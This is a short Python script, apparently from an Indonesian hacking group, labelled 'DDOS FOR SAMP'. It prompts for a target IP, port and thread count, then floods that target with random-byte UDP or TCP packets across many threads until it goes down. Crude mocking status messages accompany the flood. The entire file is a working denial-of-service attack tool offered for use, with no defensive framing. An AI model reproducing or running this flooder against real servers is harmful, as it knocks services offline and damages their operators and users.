import random
import socket
import threading

print("--- AUTHOR BY : Grizzly ---")
print("--- TOOLS BY : TEAM RITATERS COMUNITY ---")
print("--- JANGAN ABUSE KONTOL ---")
print("===================================")
print("DDOS FOR SAMP")
print("========== VERSION 1.0 ============")
ip = str(input(" TARGET IP:"))
port = int(input(" TARGET PORT:"))
choice = str(input(" GAS?(y/n):"))
times = int(input(" PAKET:"))
threads = int(input(" ONGKIR (99999):"))
def run():
  data = random._urandom(1024)
  i = random.choice(("[*]","[!]","[#]"))
  while True:
    try:
      s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
      addr = (str(ip),int(port))
      for x in range(times):
        s.sendto(data,addr)
      print(i +" DOWN GAK BANG? ")
    except:
      print("Grizzly ni Bang!!")

def run2():
  data = random._urandom(16)
  i = random.choice(("[*]","[!]","[#]"))
  while True:
    try:
      s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
      s.connect((ip,port))
      s.send(data)
      for x in range(times):
        s.send(data)
      print(i +" Packet from Shoope")
    except:
      s.close()
      print("[*] Mampus Dek")

for y in range(threads):
  if choice == 'y':
    th = threading.Thread(target = run)
    th.start()
  else:
    th = threading.Thread(target = run2)
    th.start()